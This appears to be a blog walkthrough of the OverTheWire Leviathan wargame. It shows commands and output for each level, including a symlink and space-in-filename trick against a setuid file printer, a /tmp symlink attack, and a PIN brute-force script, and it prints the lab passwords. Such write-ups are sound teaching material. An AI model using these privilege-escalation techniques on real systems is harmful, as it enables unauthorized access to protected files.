---
published: true
---
For Video tutorial:
https://youtu.be/1b-KOj3Lrjk

__Leviathan__: A large aquatic creature of some kind. The Bible refers to it as a fearsome beast having monstrous ferocity and great power. Today, the word has become synonymous with any large sea monster or creature. In literature it refers to great whales, and in Modern Hebrew, it simply means "whale". And trust me... you will have a "whale" of a time with this wargame! Eh? EH? No? -- Fine, I'll see my way out...

Anyways, (hah "whale of a time"... I think I'm funny) ... anyways, Leviathan is a wargame that was rescued from the demise of intruded.net, previously hosted on __leviathan.intruded.net__. It can now be found (http://overthewire.org/wargames/leviathan/) at OverTheWire. The wargame consists of 8 levels and is classified as 1/10 difficulty. It also states that "*This wargame doesn't require any knowledge about programming - just a bit of common sense and some knowledge about basic *nix commands.*"

Though in all honesty, it requires a bit more then what they are stating. Before we begin, for anyone going through the levels and having a hard time, all I can say is - focus on the output of code and utilize the [ltrace](http://linux.die.net/man/1/ltrace) command.

So, let's begin... shall we?


### Level 0:
For the first level we must log into leviathan, so we will SSH to leviathan0 with the username: __leviathan0__ and password: __leviathan0__

```console
root@kali:~# ssh leviathan0@leviathan.labs.overthewire.org
```

### Level 0 -> 1:
OverTheWire provides us only with one hint "Data for the levels can be found in the __homedirectories__." So we are on our own!

Let's go ahead and find out what we have in our home directory.

```console
leviathan0@melinda:~$ ls -a
.  ..  .backup  .bash_logout  .bashrc  .profile
```

__.backup__ looks promising, so let's look in there and see if we can't find anything.

```console
leviathan0@melinda:~$ cd .backup
leviathan0@melinda:~/.backup$ ls -a
.  ..  bookmarks.html
leviathan0@melinda:~/.backup$ grep leviathan1 bookmarks.html
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```

Alright, simple enough! We end up with the password `rioGegei8m` from __bookmarks.html__. Let's move on to leviathan1!

### Level 1 -> 2:
This level was fairly easy, and you can use a plethora of methods to find the password for this. First let's see what we have to work with.

```console
leviathan1@melinda:~$ ls -a
.  ..  .bash_logout  .bashrc  .profile  check
```

We can see that the home directory stores an executable called __check__, so let's run that and see what happens. 

```console
leviathan1@melissa:~$ ./check
password: 1234
Wrong password, Good Bye ...
```
Hmm... Okay, so it seems that the executable is checking for a password. This means that __check__ is comparing our input to something hardcoded. Let's run an `ltrace` and see what the library calls are for this program.

```console
leviathan1@melinda:~$ ltrace ./check
__libc_start_main(0x804852d, 1, 0xffffd7a4, 0x80485f0 <unfinished ...>
printf("password: ")                             = 10
getchar(0x8048680, 47, 0x804a000, 0x8048642password: 
)     = 10
getchar(0x8048680, 47, 0x804a000, 0x8048642
)     = 10
getchar(0x8048680, 47, 0x804a000, 0x8048642
)     = 10
strcmp("\n\n\n", "sex")                          = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)             = 29
+++ exited (status 0) +++
```

Looking at the output, we can see that the program is using `strcmp`, which is a C library function that compares two strings against one another. In this executable, it's comparing the password input against the word "sex". Let's see if "sex" will work.

```console
leviathan1@melinda:~$ ./check
password: sex
$ whoami
leviathan2
$ cat /etc/leviathan_pass/leviathan2
ougahZi8Ta
```

And there we have the password! Now, if you think this was hard... it get's harder, so strap in as we move to leviathan2!


### Level 2 -> 3:
This level is really interesting in my honest opinion, as it allows you to exploit a flaw in the executable. It took me a while and a lot of [Google Fu](https://en.wiktionary.org/wiki/Google-fu) (yes, it's a thing) to finally figure out how the get the password from __/etc/leviathan_pass/leviathan3__.

```console
leviathan2@melinda:~$ ls -la
total 28
drwxr-xr-x   2 root       root       4096 Nov 14  2014 .
drwxr-xr-x 172 root       root       4096 Jul 10 14:12 ..
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
-r-sr-x---   1 leviathan3 leviathan2 7498 Nov 14  2014 printfile
leviathan2@melinda:~$ ./printfile
*** File Printer ***
Usage: ./printfile filename
```

Alright, so it seems the program __printfile__ outputs the text from a file; just like `cat`. Therefore, we can assume that it's using `cat` somewhere in the code. Yet, hold on a second... I like working smart, and not hard. Let's see if we can get the __leviathan3__ password file from __/etc/leviathan_pass/__ using this exe.

```console
leviathan2@melinda:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```

Darn... guess not. That's okay, let's go ahead and make a temp directory, and a new text file that we can use for testing the program with `ltrace`.

```console
leviathan2@melinda:~$ mkdir /tmp/jhalon && touch /tmp/jhalon/test.txt
leviathan2@melinda:~$ cd /tmp/jhalon
leviathan2@melinda:/tmp/jhalon$ ltrace ~/printfile test.txt
__libc_start_main(0x804852d, 2, 0xffffd744, 0x8048600 <unfinished ...>
access("test.txt", 4)                            = 0
snprintf("/bin/cat test.txt", 511, "/bin/cat %s", "test.txt") = 17
system("/bin/cat test.txt" <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                           = 0
+++ exited (status 0) +++
```

From the output, we can see that there is a small security hole in the way this program functions. If you look closely, you can see that the function `access()` and __/bin/cat__ are being called on the input file. What `access()` does is check permissions based on the process’ real user ID rather than the effective user ID.

To explain: The real user id is who you really are (the one who owns the process), and the effective user id is what the operating system looks at to make a decision on whether or not you are allowed to do something (most of the time, there are some exceptions). 

And if we look back into the previous `ls -la` output, we can see that __printfile__ is owned by __leviathan3__. So `access()` will call the process with __leviathan3's__ privileges.

Looking into the code we also see that __/bin/cat__ is being called on the file to output the contents. While `access()` uses the full path's filename, __/bin/cat__ uses just the first part of the filename. (This is due to how the " " are set up in the program) What we can do here is try to add a space to a filename, and if we are correct, __/bin/cat__ will read the file as 2 separate files.

```console
leviathan2@melinda:/tmp/jhalon$touch pass\ file.txt
leviathan2@melinda:/tmp/jhalon$ ltrace ~/printfile "pass file.txt"
__libc_start_main(0x804852d, 2, 0xffffd744, 0x8048600 <unfinished ...>
access("pass file.txt", 4)                       = 0
snprintf("/bin/cat pass file.txt", 511, "/bin/cat %s", "pass file.txt") = 22
system("/bin/cat pass file.txt"/bin/cat: pass: No such file or directory
/bin/cat: file.txt: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                           = 256
+++ exited (status 0) +++
```

I was right! As you can see, __/bin/cat__ calls "__pass file.txt__" as two separate files, "__pass__" and "__file.txt__". We can actually exploit this! Let’s go ahead and create a [symbolic link](https://en.wikipedia.org/wiki/Symbolic_link) for the "__pass__" part in "__pass file.txt__", and link it to __/etc/leviathan_pass/leviathan3__.

```console
leviathan2@melinda:/tmp/jhalon$ ln -s /etc/leviathan_pass/leviathan3 /tmp/jhalon/pass
leviathan2@melinda:/tmp/jhalon$ ls -la
total 7864
drwxrwxr-x 2 leviathan2 leviathan2    4096 Sep 10 04:55 .
drwxrwx-wt 1 root       root       8036352 Sep 10 04:55 ..
lrwxrwxrwx 1 leviathan2 leviathan2      30 Sep 10 04:55 pass -> /etc/leviathan_pass/leviathan3
-rw-rw-r-- 1 leviathan2 leviathan2       0 Sep 10 04:54 pass file.txt
leviathan2@melinda:/tmp/jhalon$ ~/printfile "pass file.txt"
Ahdiemoo1j
/bin/cat: file.txt: No such file or directory
```

And bingo was his name, OH! We got the password for leviathan3! Go do a victory lap around the house, you deserved it!

### Level 3 -> 4:
This level was a bit easier than the previous one. Just use what you learned from the previous levels to your advantage. Let's begin by seeing what we have at our disposal.

```console
leviathan3@melinda:~$ ls -la
total 32
drwxr-xr-x   2 root       root       4096 Mar 21  2015 .
drwxr-xr-x 172 root       root       4096 Jul 10 14:12 ..
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
-r-sr-x---   1 leviathan4 leviathan3 9962 Mar 21  2015 level3
```

Alright, we have another executable called __level3__, let's run it and see what happens.

```console
leviathan3@melinda:~$ ./level3
Enter the password> 1234
bzzzzzzzzap. WRONG
```

Another password... great! Let's go ahead and run `ltrace` to see what the library calls are for this program.

```console
leviathan3@melinda:~$ ltrace ./level3
__libc_start_main(0x80485fe, 1, 0xffffd794, 0x80486d0 <unfinished ...>
strcmp("h0no33", "kakaka")                       = -1
printf("Enter the password> ")                   = 20
fgets(Enter the password> 1234
"1234\n", 256, 0xf7fc9c20)                 = 0xffffd58c
strcmp("1234\n", "snlprintf\n")                  = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                       = 19
+++ exited (status 0) +++
```

Looking at the `ltrace` we can see that `strcmp` is being called 2 times. This is trying to obfuscate us from the main password, but let's focus on the one that compares our input. We can see that it tries to compare the input against "__snlprintf__"; let's try it as the password.

```console
leviathan3@melinda:~$ ./level3
Enter the password> snlprintf
[You've got shell]!
$ whoami
leviathan4
$ cat /etc/leviathan_pass/leviathan4
vuH0coox6m
```

Wow, that was easier then pressing a Staples button! Okay... moving on to leviathan4!

### Level 4 -> 5:
As always, let's see what we have to work with.

```console
leviathan4@melinda:~$ ls -la
total 24
drwxr-xr-x   3 root root       4096 Nov 14  2014 .
drwxr-xr-x 172 root root       4096 Jul 10 14:12 ..
-rw-r--r--   1 root root        220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root root       3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root root        675 Apr  9  2014 .profile
dr-xr-x---   2 root leviathan4 4096 Nov 14  2014 .trash
```

__.trash__ looks promising, let's go ahead and see what's stored in that directory.

```console
leviathan4@melinda:~$ cd .trash
leviathan4@melinda:~/.trash$ ls -la
total 16
dr-xr-x--- 2 root       leviathan4 4096 Nov 14  2014 .
drwxr-xr-x 3 root       root       4096 Nov 14  2014 ..
-r-sr-x--- 1 leviathan5 leviathan4 7425 Nov 14  2014 bin
leviathan4@melinda:~/.trash$ ./bin
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010 
```

Interesting... it's a Binary Output. Let's go online, and use a Binary to ASCII converter. I used [RapidTables](http://www.rapidtables.com/convert/number/binary-to-ascii.htm) to do my conversion. After converting the Binary, we get the password `Tith4cokei`.

Easy enough, not too hard if you know what you were looking at. Let's move on to leviathan5!

### Level 5 -> 6:
Alright, so far we had some easy ones and some hard ones... let's see what's in store for us on leviathan5.

```console
leviathan5@melinda:~$ ls -la
total 28
drwxr-xr-x   2 root       root       4096 Nov 14  2014 .
drwxr-xr-x 172 root       root       4096 Jul 10 14:12 ..
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
-r-sr-x---   1 leviathan6 leviathan5 7634 Nov 14  2014 leviathan5
```

Another executable, okay. Let's run it and see what we get.

```console
leviathan5@melinda:~$ ./leviathan5
Cannot find /tmp/file.log
```

Okay. So it seems that the executable is trying to pull information on a file that doesn't exist. Let's run an `ltrace` and see what is being called.

```console
leviathan5@melinda:~$ ltrace ./leviathan5
__libc_start_main(0x80485ed, 1, 0xffffd794, 0x8048690 <unfinished ...>
fopen("/tmp/file.log", "r")                      = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                = 26
exit(-1 <no return ...>
+++ exited (status 255) +++
```

Interesting, it seems that the executable is using `fopen` on __/tmp/file.log__. Let's go ahead and create a symlink to __/etc/leviathan_pass/levithan6__ and link it to __/tmp/file.log__.

```console
leviathan5@melinda:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@melinda:~$ ./leviathan5
UgaoFee4li
```

Easy enough! We got the password and we can move on to leviathan6!

### Level 6 -> 7:
As always, let's run `ls -la` and see what we have to work with.

```console
leviathan6@melinda:~$ ls -la
total 28
drwxr-xr-x   2 root       root       4096 Nov 14  2014 .
drwxr-xr-x 172 root       root       4096 Jul 10 14:12 ..
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
-r-sr-x---   1 leviathan7 leviathan6 7484 Nov 14  2014 leviathan6
leviathan6@melinda:~$ ./leviathan6
usage: ./leviathan6 <4 digit code>
```

Another executable, shocker... really. This one in particular, is asking us to input a 4 digit pin. Let's try and brute force it! We will start by creating a tmp directory and opening `nano` to write a shell script.

```console
leviathan6@melinda:~$ mkdir /tmp/jhalon
leviathan6@melinda:~$ nano /tmp/jhalon/brute.sh
```

Our shell script will look something like this...

```bash
#!/bin/bash

for a in {0000..9999}
do
~/leviathan6 $a
done
```

Save the script as `bash.sh` or anything you'd like for that matter, and let's use `chmod` to give it executable permissions. Once done, let's run the script.

```console
leviathan6@melinda:/tmp/jhalon$ chmod +x brute.sh
leviathan6@melinda:/tmp/jhalon$ ./brute.sh
```

Give the script ~20 seconds to run and you should see a blank command line with `$` appear... 

```console
$ whoami 
leviathan7
$ cat /etc/leviathan_pass/leviathan7
ahy7MaeBo9
```
Done! We got the password! Technically this is the last level... but let's SSH into leviathan7 to see what's in there.

### Level 7

```console
leviathan7@melinda:~$ ls -la
total 24
drwxr-xr-x   2 root       root       4096 Nov 14  2014 .
drwxr-xr-x 172 root       root       4096 Jul 10 14:12 ..
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
-r--r-----   1 leviathan7 leviathan7  178 Nov 14  2014 CONGRATULATIONS
leviathan7@melinda:~$ cat CON*
Well Done, you seem to have used a *nix system before, now try something more serious.
```

Congratulations! You have conquered __Leviathan__!
